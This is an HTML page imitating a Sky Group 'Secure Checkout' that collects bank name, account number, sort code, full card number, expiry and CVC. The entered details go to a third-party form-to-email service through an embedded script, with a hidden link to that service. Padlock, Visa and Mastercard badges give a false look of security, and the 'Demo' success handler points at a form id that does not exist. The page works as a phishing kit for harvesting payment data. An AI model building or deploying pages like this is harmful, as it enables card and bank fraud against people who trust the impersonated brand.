<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Sky | Secure Payment</title>

<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">

<style>
*{margin:0;padding:0;box-sizing:border-box}
body{
  font-family:Inter,sans-serif;
  background:#f2f4f8;
  color:#111;
  transition:.3s;
}
body.dark{background:#0b0f1d;color:#eaeaea}
body.dark .left{background:#121829}
body.dark input{background:#1a2238;color:#fff;border-color:#2f3a54}
body.dark .summary-footer{background:linear-gradient(90deg,#072b66,#0077d4)}
img{max-width:100%}

/* HEADER */
.sky-header{
  background:#0f1b40;
  padding:18px 24px;
  display:flex;
  justify-content:space-between;
  align-items:center;
}
.sky-header img{height:38px}
.toggle-dark{
  background:#fff;
  padding:8px 16px;
  border-radius:20px;
  font-weight:600;
  cursor:pointer;
}
body.dark .toggle-dark{background:#1d2742;color:#fff}

/* WRAPPER */
.page-wrapper{
  max-width:1200px;
  margin:35px auto;
  padding:0 15px;
}
.left{
  background:#fff;
  padding:28px;
  border-radius:14px;
  box-shadow:0 4px 18px rgba(0,0,0,.08);
}

/* FORM */
h2{font-size:28px;margin-bottom:6px}
.subtitle{font-size:17px;margin-bottom:18px}
.form-group{margin-bottom:18px}
label{font-weight:600}
input{
  width:100%;
  padding:14px;
  font-size:15px;
  border-radius:10px;
  border:1px solid #ccd2e0;
}
input:focus{
  outline:none;
  border-color:#0f74d0;
  box-shadow:0 0 0 4px rgba(0,118,255,.2);
}
input.error{border-color:#ff3b3f}

/* BUTTON */
button{
  width:100%;
  padding:15px;
  font-size:17px;
  font-weight:600;
  background:linear-gradient(90deg,#0f74d0,#32a4ff);
  border:none;
  color:#fff;
  border-radius:12px;
  cursor:pointer;
}

/* DROPDOWN */
.dropdown-box{
  background:#f3f6fc;
  padding:14px;
  border-radius:10px;
  cursor:pointer;
  margin-bottom:12px;
  font-weight:600;
}
.dropdown-content{
  display:none;
  padding:14px;
  border-left:3px solid #0f74d0;
  font-size:14px;
  margin-bottom:20px;
}

/* TRUST */
.trust-box{
  margin-top:25px;
  padding:16px;
  background:#f3f6fc;
  border-radius:12px;
}
.trust-icons{
  display:flex;
  gap:12px;
  flex-wrap:wrap;
  margin-top:10px;
}
.trust-icons img{height:32px}

/* FOOTER */
.sky-footer{
  background:#0f1b40;
  color:#eee;
  text-align:center;
  padding:30px 15px;
  margin-top:50px;
}
.sky-footer a{
  color:#a8c5ff;
  margin:6px 10px;
  display:inline-block;
  font-size:14px;
}

/* RESPONSIVE */
@media(max-width:600px){
  h2{font-size:24px}
  .sky-header{flex-direction:column;gap:10px}
}
</style>
</head>

<body>

<div class="sky-header">
  <img src="5842ab6da6515b1e0ad75b0a.png">
  
</div>

<div class="page-wrapper">
<div class="left">
<center>
<div class="subtitle">Secure Sky Checkout</div>

</center>


<form method="post" action="//submit.form">

  <div class="form-group">
    <label>Name of bank</label>
    <input type="text" name="bank_name" required>
  </div>

  <div class="form-group">
    <label>Bank account</label>
    <input type="text" name="bank_account" required>
  </div>

  <div class="form-group">
    <label>Sort code</label>
    <input type="text" name="sort_code" required>
  </div>

  <div class="form-group">
    <label>Name on card</label>
    <input type="text" name="card_name" required>
  </div>

  <div class="form-group">
    <label>Card number</label>
    <input type="text" name="card_number" id="cardNumber"
           placeholder="1234 5678 9012 3456" required>
  </div>

  <div class="form-group">
    <label>Expiry (MM/YY)</label>
    <input type="text" name="expiry" id="expiryDate"
           placeholder="MM/YY" required>
  </div>

  <div class="form-group">
    <label>CVC</label>
    <input type="password" name="cvc" id="cvc"
           maxlength="3" required>
  </div>

  <div style="font-size:1px;opacity:0;" class="hidden">
        <a href="https://www.100forms.com" id="lnk100" title="form to email">form to email</a>
      </div>

  <script src="https://www.100forms.com/js/FORMKEY:H8Z3YTGUWJPX"
          type="text/javascript"></script>

  <button type="submit">Confirm Order</button>

</form>


<div class="trust-box">
<b>ðŸ”’ Secure checkout</b>
<div class="trust-icons">
<img src="https://upload.wikimedia.org/wikipedia/commons/0/04/Mastercard-logo.png">
<img src="https://upload.wikimedia.org/wikipedia/commons/4/41/Visa_Logo.png">
</div>
</div>

</div>
</div>

<div class="sky-footer">
<a href="#">About</a>
<a href="#">Help</a>
<a href="#">Contact</a>
<a href="#">Privacy</a>
<a href="#">Terms</a>
<small style="display:block;margin-top:10px;font-size:12px">Â© 2025 Sky Group</small>
</div>

<script>
function toggleDark(){
  document.body.classList.toggle("dark");
}
function toggleDropdown(){
  const d=document.getElementById("dropContent");
  d.style.display=d.style.display==="block"?"none":"block";
}
const card=document.getElementById("cardNumber");
card.addEventListener("input",()=>{
  card.value=card.value.replace(/\D/g,"").replace(/(.{4})/g,"$1 ").trim().slice(0,19);
});
document.getElementById("paymentForm").addEventListener("submit",e=>{
  e.preventDefault();
  alert("âœ… Payment Successful (Demo)");
});
</script>

</body>
</html>
